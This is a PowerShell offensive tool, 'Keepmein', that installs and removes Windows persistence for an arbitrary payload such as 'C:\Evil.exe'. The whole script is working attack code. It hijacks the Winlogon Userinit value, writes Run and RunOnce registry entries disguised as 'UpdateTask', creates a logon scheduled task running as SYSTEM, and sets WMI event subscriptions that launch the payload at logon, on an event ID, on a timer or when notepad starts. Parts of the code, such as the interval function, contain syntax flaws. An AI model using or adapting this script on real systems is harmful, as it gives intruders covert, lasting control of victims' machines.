<#
Script for automating Windows persistence using different techniques

To Install
PS> Keepmein -Action Install -Payload "C:\Evil.exe" -Method SchTask

To Remove
PS> Keepmein -Action Remove -Payload "C:\Evil.exe" -Method SchTask

References
https://attack.mitre.org/wiki/Persistence
http://www.exploit-monday.com/2016/08/wmi-persistence-using-wmic.html
https://www.rapid7.com/db/modules/exploit/windows/local/wmi_persistence
#>
function Keepmein{
    param([String]$Payload,[String]$Action,[String]$Method)
    $wid=[System.Security.Principal.WindowsIdentity]::GetCurrent()
    $prp=new-object System.Security.Principal.WindowsPrincipal($wid)
    $adm=[System.Security.Principal.WindowsBuiltInRole]::Administrator
    $IsAdmin=$prp.IsInRole($adm)
    if ($IsAdmin)
    {
        Write-Host "[*] Running with admin privs" -ForegroundColor Green
    }else{
        Write-Host "[*] Running without admin privs"  -ForegroundColor Red
    }
    switch($Method)
    {
        "Winlogon" {persistenceWinlogon $Payload $Action}
        "Run" {persistenceRun $Payload $Action}
        "RunOnce" {persistenceRunOnce $Payload $Action}
        "SchTask" {persistenceSchTask $Payload $Action}
        "StartupFolder" {persistenceStartupFolder $Payload $Action}
        "WMIlogon" {BasicWMI_logon $Payload $Action}
        "WMIevent" {BasicWMI_event $Payload $Action}
        "WMIeventProcess" {BasicWMI_event_PROCESS $Payload $Action}
        default {Write-Host "[-] Invalid or missing method"}
    }
}

function persistenceWinlogon([String]$Payload,[String]$Action){
    if ($IsAdmin){
        if ($Action -eq "Install"){
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "$Payload","C:\Windows\system32\userinit.exe"
        }elseif($Action -eq "Remove"){
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe"
        }
    }
    else{
        write-host "[-] This method requires admin privs" -ForegroundColor Red
    }
}


function persistenceRun([String]$Payload,[String]$Action){
    
    if ($Action -eq "Install"){
        if ($IsAdmin){
            write-host "[*] Installing in admin level"
            reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdateTask /t REG_SZ /d "$Payload"
        }else{
            write-host "[*] Installing in user level"
            reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdateTask /t REG_SZ /d "$Payload"
        }
            
        }elseif($Action -eq "Remove"){
            if ($IsAdmin){
            write-host "[*] Removing in admin level"
            reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdateTask 
        }else{
            write-host "[*] Removing in user level"
            reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdateTask
        
        }
        }
}

function persistenceRunOnce([String]$Payload,[String]$Action){
    
    if ($Action -eq "Install"){
        if ($IsAdmin){
            write-host "[*] Installing in admin level"
            reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v UpdateTask /t REG_SZ /d "$Payload"
        }else{
            write-host "[*] Installing in user level"
            reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v UpdateTask /t REG_SZ /d "$Payload"
        }
            
        }elseif($Action -eq "Remove"){
            if ($IsAdmin){
            write-host "[*] Removing in admin level"
            reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v UpdateTask 
        }else{
            write-host "[*] Removing in user level"
            reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v UpdateTask
        
        }
        }
}

function persistenceSchTask([String]$Payload,[String]$Action){
    
    if ($Action -eq "Install"){
        if ($IsAdmin){
            write-host "[*] Installing in admin level"
            schtasks /create /ru "NT AUTHORITY\SYSTEM" /sc onlogon /rp "" /tn "UpdateTask" /tr "$Payload"
        }else{
            write-host "[*] Installing in user level"
            $password = Read-Host -Prompt "Insert the password for $env:UserName "
            schtasks /create /ru $env:UserName /rp $password /sc onlogon /rp "" /tn "UpdateTask" /tr "$Payload"
        }
            
        }elseif($Action -eq "Remove"){
            if ($IsAdmin){
            write-host "[*] Removing in admin level"
           schtasks /Delete /tn UpdateTask 
        }else{
            write-host "[*] Removing in user level"
           schtasks /Delete /tn UpdateTask
        
        }
        }
}

function persistenceStartupFolder{
    write-host ("Put the payload as binary, script or application shortcut onto: C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

> Windows NT 6.0 - 10.0 / All Users
%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

> Windows NT 6.0 - 10.0 / Current User
%SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

> Windows NT 5.0 - 5.2
%SystemDrive%\Documents and Settings\All Users\Start Menu\Programs\Startup

> Windows NT 3.5 - 4.0
%SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\Startup")
}

function BasicWMI_logon ([String]$Payload,[String]$Action){
    if ($IsAdmin){
        $filterName = "BasicWMIfilter_EVENT"
        $consumerName = "BasicWMIconsumer_EVENT"
        if ($Action -eq "Install"){
            $filterName = "BasicWMIfilter_LOGON"
            $consumerName = "BasicWMIconsumer_LOGON"
            $SecondA = 1
            $SecondB = 3
            $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= $secondA AND TargetInstance.SystemUpTime < $secondB" # will trigger between 2 and 3 seconds after logon
            $WMIEventFilter=Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL"; Query=$Query} -ErrorAction Stop
            $WMIEventConsumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName;CommandLineTemplate=$payload} 
            $WMIBindingFilterConsumer = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
        }elseif($Action -eq "Remove"){
            $EventConsumerToRemove = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$consumerName'"
            $EventFilterToRemove = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$filterName'"
            $FilterConsumerBindingToRemove = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToRemove.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
            $FilterConsumerBindingToRemove | Remove-WmiObject
            $EventConsumerToRemove | Remove-WmiObject
            $EventFilterToRemove | Remove-WmiObject
    }
    }else{
        write-host "[-] This method requires admin privs" -ForegroundColor Red
    }
}

function BasicWMI_event ([String]$Payload,[String]$Action){
    if ($IsAdmin){  
        $filterName = "BasicWMIfilter_EVENT"
        $consumerName = "BasicWMIconsumer_EVENT"
        if ($Action -eq "Install"){

        $eventId = "6000"
        $Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND Targetinstance.EventCode = '$eventId'"
        $WMIEventFilter=Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL"; Query=$Query} -ErrorAction Stop
        $WMIEventConsumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName;CommandLineTemplate=$payload} 
        $WMIBindingFilterConsumer = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
    }elseif($Action -eq "Remove"){
        $EventConsumerToRemove = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$consumerName'"
        $EventFilterToRemove = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$filterName'"
        $FilterConsumerBindingToRemove = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToRemove.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
        $FilterConsumerBindingToRemove | Remove-WmiObject
        $EventConsumerToRemove | Remove-WmiObject
        $EventFilterToRemove | Remove-WmiObject
    }
    }else{
        write-host "[-] This method requires admin privs" -ForegroundColor Red
    }
}
function BasicWMI_event_INTERVAL ([String]$Payload,[String]$Action){
    if ($IsAdmin){ 
        $filterName = "BasicWMIfilter_EVENT"
        $consumerName = "BasicWMIconsumer_EVENT"
        if ($Action -eq "Install"){
        $filterName = "BasicWMIfilter_INTERVAL"
        $consumerName = "BasicWMIconsumer_INTERVAL"
        $callback_interval = 1
        $timer = Set-WmiInstance -Namespace root/cimv2 -Class __IntervalTimerInstruction -Arguments @{ IntervalBetweenEvents = ([UInt32] $callback_interval); SkipIfPassed = $false; TimerID = \"Trigger\"}
        $Query = "Select * FROM __TimerEvent WHERE TimerID = 'trigger'"
        $WMIEventFilter=Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL"; Query=$Query} -ErrorAction Stop
        $WMIEventConsumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName;CommandLineTemplate=$payload} 
        $WMIBindingFilterConsumer = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
    }elseif($Action -eq "Remove"){
        $EventConsumerToRemove = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$consumerName'"
        $EventFilterToRemove = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$filterName'"
        $FilterConsumerBindingToRemove = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToRemove.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
        $FilterConsumerBindingToRemove | Remove-WmiObject
        $EventConsumerToRemove | Remove-WmiObject
        $EventFilterToRemove | Remove-WmiObject
    }
    }else{
        write-host "[-] This method requires admin privs" -ForegroundColor Red
    }

}
function BasicWMI_event_PROCESS ([String]$Payload,[String]$Action){
    if ($IsAdmin){
        $filterName = "BasicWMIfilter_EVENT"
        $consumerName = "BasicWMIconsumer_EVENT"
        if ($Action -eq "Install"){
        $filterName = "BasicWMIfilter_PROCESS"
        $consumerName = "BasicWMIconsumer_PROCESS"
        $process_name = "notepad"
        $Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName= '$process_name'"
        $WMIEventFilter=Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL"; Query=$Query} -ErrorAction Stop
        $WMIEventConsumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName;CommandLineTemplate=$payload} 
        $WMIBindingFilterConsumer = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
    }elseif($Action -eq "Remove"){
        $EventConsumerToRemove = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$consumerName'"
        $EventFilterToRemove = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$filterName'"
        $FilterConsumerBindingToRemove = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToRemove.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
        $FilterConsumerBindingToRemove | Remove-WmiObject
        $EventConsumerToRemove | Remove-WmiObject
        $EventFilterToRemove | Remove-WmiObject
    }
    }else{
        write-host "[-] This method requires admin privs" -ForegroundColor Red
    }

}

